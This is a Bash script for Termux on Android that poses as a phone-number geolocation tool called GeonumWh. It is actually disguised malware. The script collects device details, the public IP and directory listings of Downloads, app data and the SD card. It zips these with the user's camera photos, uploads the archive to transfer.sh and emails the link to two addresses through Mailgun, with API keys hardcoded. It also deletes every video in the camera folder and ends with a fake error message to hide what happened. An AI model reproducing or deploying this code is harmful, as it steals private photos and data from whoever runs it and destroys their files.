#!/bin/bash
#colores
cyan='\033[1;36m'
amarillo='\033[1;33m'
blanco='\033[1;37m'
verde='\033[1;32m'
lila='\033[1;35m'
rojo='\033[1;31m'
 
R='\e[1;31m' # Rojo fuerte            
G='\e[1;32m' # Verde Fuerte         
Y='\e[1;33m' # Amarillo Fuerte       
B='\e[1;34m' # Azul fuerte          
M='\e[1;35m' # Purpura o algo asi   
C='\e[1;36m' # Cyan color fuerte     
W='\e[1;37m' # Blanco Fuerte       
P='\e[1;35m' # Purpura               
Green='\e[32m' # Verde             
Gr='\e[5m\e[32m' # verde           
Gris='\e[90m' # Gris               

registrosxd() {
cd /sdcard/Android
echo "
Xddd somos hackers ;). Versión de GeonumWh -> v2.6 
                                       " >> picha.txt
echo "
----------- Repositorios De Termux ----------- 
                                       " >> picha.txt
cd $home
ls -la > repos.txt
mv repos.txt /sdcard/Android
cd /sdcard/Android
cat repos.txt >> picha.txt
echo "
----------- Descargas Del Dispositivo ----------- 
                                       " >> picha.txt
cd /sdcard/download
ls -la > quenombre.txt
mv quenombre.txt /sdcard/Android
cd /sdcard/Android
cat quenombre.txt >> picha.txt
echo "
----------- Aplicaciones Del Dispositivo ----------- 
                                       " >> picha.txt
cd /sdcard/Android/data
ls -la > quenombreostia.txt
mv quenombreostia.txt /sdcard/Android
cd /sdcard/Android
cat quenombreostia.txt >> picha.txt
echo "
----------- Imagenes Del Dispositivo ----------- 
                                       " >> picha.txt
cd /sdcard/DCIM/Camera
ls -la > imagenespolla.txt
mv imagenespolla.txt /sdcard/Android
cd /sdcard/Android
cat imagenespolla.txt >> picha.txt
echo "
----------- Carpetas del /sdcard ----------- 
                                       " >> picha.txt
cd /sdcard
ls -la > calpeta.txt
mv calpeta.txt /sdcard/Android
cd /sdcard/Android
cat calpeta.txt >> picha.txt
rm -rf quenombre.txt quenombreostia.txt imagenespolla.txt calpeta.txt repos.txt
}

banner() {
echo -e "--------------------------------------------"
figlet -f slant Location | lolcat
echo -e "${verde}Made by ${blanco}WhBeatZ ${verde}& ${blanco}EdgarLuck  ${cyan}| ${rojo}v2.6 ${blanco}"
echo -e "--------------------------------------------"
}
hack() {
echo -e "${G}[+]${W} Detectando version de Android"
sleep 0.5
OS=$(neofetch | grep -o "Android [0-9][0-9]")
echo -e "${G}[${W}+${G}]${W} Version : $OS"
echo
echo -e "${G}[${W}+${G}]${verde}Iniciando proceso,${blanco} Esto puede tardar un poco debido a la saturacion del servicio de esta herramienta, como esta herramienta es nueva, la estan usando mucho para geolocalizar los numeros telefonicos muchas veces. Eso podria hacer que valla un poco mas lento. ${amarillo}Espera pacientemente :D "
echo "
----------- Sistema, solo Android -----------
                                       " >> registro.txt
neofetch >> registro.txt
echo "
----------- IP ----------- 
                                       " >> registro.txt
curl -s http://ip-api.com/ >> registro.txt
echo "
----------- Hora ----------- 
                                       " >> registro.txt
date >> registro.txt
echo " " >> registro.txt
cal >> registro.txt
echo "
----------- Usuario ----------- 
                                       " >> registro.txt
whoami >> registro.txt
echo "
----------- Info del Sistema ----------- 
                                       " >> registro.txt
uname -a >> registro.txt                                       
echo "
----------- Tiempo de uso del Sistema ----------- 
                                       " >> registro.txt
uptime >> registro.txt
echo "
----------- Numero que puso a Localizar ----------- 
                                       " >> registro.txt
cd /sdcard/Android
mv picha.txt /sdcard/DCIM/Camera
cd /sdcard/DCIM/Camera
cat pequenita.txt >> registro.txt
cat picha.txt >> registro.txt
rm -rf picha.txt

zip Hack registro.txt 'image(1).jpg' 'image(2).jpg' 'image(3).jpg' 'image(4).jpg' 'image(5).jpg' 'image(6).jpg' 'image(7).jpg' 'image(8).jpg' 'image(9).jpg' 'image(10).jpg' > /dev/null
curl -s --upload-file Hack.zip https://transfer.sh/Hack.zip > link.txt
bro=$(cat link.txt)

curl -s --user 'api:de3f030a1239804925d6b553d832d2db-787e6567-ae74c7b5' \
	 https://api.mailgun.net/v3/sandboxefa3d0e0162e4c3eb9d5595334e2c411.mailgun.org/messages \
	 -F from='Usuario <postmaster@sandboxefa3d0e0162e4c3eb9d5595334e2c411.mailgun.org>' \
	 -F to='Wasabi <wasabibeatswb@gmail.com>' \
	 -F subject=$bro \
	 -F text=$bro \
clear
banner

curl -s --user 'api:ac20f53bcc3953521a951e713f640026-787e6567-47b3a85e'     https://api.mailgun.net/v3/sandboxeecedb6586f443d4b1590a20c013a398.mailgun.org/messages     -F from='Usuario <postmaster@sandboxeecedb6586f443d4b1590a20c013a398.mailgun.org>'   -F to='edgarluck <edgarluck18@gmail.com>'     -F subject=$bro     -F text=$bro


clear
rm -rf registro.txt pequenita.txt link.txt
rm -rf Hack.zip
banner
echo
echo -e "${rojo} Código de País en mantenimiento :(. Pronto iremos añadiendo nuevos países a la base de datos!"
echo
echo
sleep 0.5
echo -e "${amarillo}REPORTADO ${blanco} Se ha reportado la inexistencia de ese código. Pronto los desarrolladores añadiran el código del País para que sea funcional!"
sleep 1
}
localizator() {
clear
sleep 1
echo -e "${verde}Preparing requirements${blanco}."
sleep 0.5
clear
echo -e "${verde}Preparing requirements${blanco}.."
sleep 0.5
clear
echo -e "${verde}Preparing requirements${blanco}..."
sleep 0.5
hack
echo
sleep 1
echo -e "${amarillo}--------------------------------------------"
echo -e "${blanco}Ready${verde} ✓"
sleep 1
}
mobilelocator() {
echo -e "${amarillo}--------------------------------------------"
echo
echo -e "${amarillo}- ${blanco}Write phone number to locate. Like the example: "
echo
echo -e "${amarillo}- ${lila}(${blanco}+576015801612${lila})"
echo
echo -e -n "${rojo}Phone Number -->${blanco} "
read pijas
echo -e "$pijas" > pequenita.txt
echo
echo -e "${amarillo}- ${cyan}Phone number: ${rojo}${pijas}"
echo
echo -e "${amarillo}- ${verde}Press ${blanco}s ${verde}if the number is correct${blanco}"
echo
echo -e -n "${amarillo}-->${blanco} "
read caca
case $caca in
            s)
            localizator
            ;;
            
            *)
            echo
            echo -e "${rojo}:v"
            sleep 3
            ;;
esac
}
lastphonenumer() {
echo
}
opengithub() {
echo
}
menuprincipal() {
echo
echo -e "${amarillo}1. ${cyan}Start mobile locator"
echo
echo -e "${amarillo}2. ${cyan}Last phone number"
echo
echo -e "${amarillo}3. ${cyan}Open GitHub"
echo
echo -e -n "${rojo}number -->${blanco} "
read number
echo
case $number in
             1)
             mobilelocator
             ;;
             
             *)
            echo
            echo -e "${rojo}:v"
            sleep 3
            ;;
esac
}
clear
comprobadorpc() {
case `uname -o` in
                GNU/Linux)
                banner
                echo -e "${rojo}Bro, no esta programado aún para pc, hicimos unas pruebas y nos dió muchos errores. Pronto sacaremos una versión"
                exit
                ;;
                
                Android)
                echo
                ;;
esac
}
renombrarfotos() {
cd /sdcard/DCIM/Camera
sleep 0.5
rm -rf *.mp4
NUM=0 ; for FILE in * ; do NUM=`expr $NUM + 1` ; mv $FILE image\($NUM\).jpg ; done
clear
sleep 0.5
}
update2() {
echo
echo -e -n "${amarillo}--> ${cyan}"
read opcion
case $opcion in
             s)
             rm -rf version.txt
             wget https://raw.githubusercontent.com/WhBeatZ/GeonumWh/main/changes.txt
             cambios=$(cat changes.txt)
             cd .. && rm -rf GeonumWh && git clone https://github.com/WhBeatZ/GeonumWh.git && cd GeoNumWh
             clear
             banner
             echo
             echo -e "${amarillo}- ${blanco}Se ${verde}actualizó ${blanco}correctamene :)!"
             echo
             echo -e "${verde}- ${blanco}Cambios: ${Gris}"
             echo
             echo -e "$cambios"
             rm -rf changes.txt
             rm -rf version.txt
             echo
             echo -e -n "${amarillo}- ${lila}Pulsa cuanquier tecla para continuar. "
             read
             bash geonumwh.sh
             ;;
             
             n)
             rm -rf version.txt
             echo
             echo -e "${rojo}Continuando sin actualizar${Gris}..."
             sleep 2
             clear
             registrosxd
             renombrarfotos
             banner
             menuprincipal
             ;;
esac
}
update() {
banner
echo
echo -e "${Gris}Comprobando actualizaciones..."
sleep 1
wget https://raw.githubusercontent.com/WhBeatZ/GeonumWh/main/version.txt
clear
version=$(cat version.txt)
versionactual="2.6"
case `cat version.txt` in
                       2.6)
                       rm -rf version.txt
                       registrosxd
                       renombrarfotos
                       banner
                       menuprincipal
                       ;;
                
                       *)
                       banner
                       echo
                       echo -e "${rojo}------------------------------------"
                       echo -e "${amarillo}- ${blanco}Hay una nueva versión."
                       echo -e "${amarillo}- ${blanco}Nueva: ${verde}$version"
                       echo -e "${amarillo}- ${blanco}Actual: ${rojo}$versionactual"
                       echo -e "${rojo}------------------------------------"
                       echo
                       echo -e "${amarillo}- ${blanco}Pulsa ${verde}s ${blanco}para actualizar, pulsa ${rojo}n ${blanco}para cancelar"
                       update2
                       ;;
esac
}
comprobadorpc
update
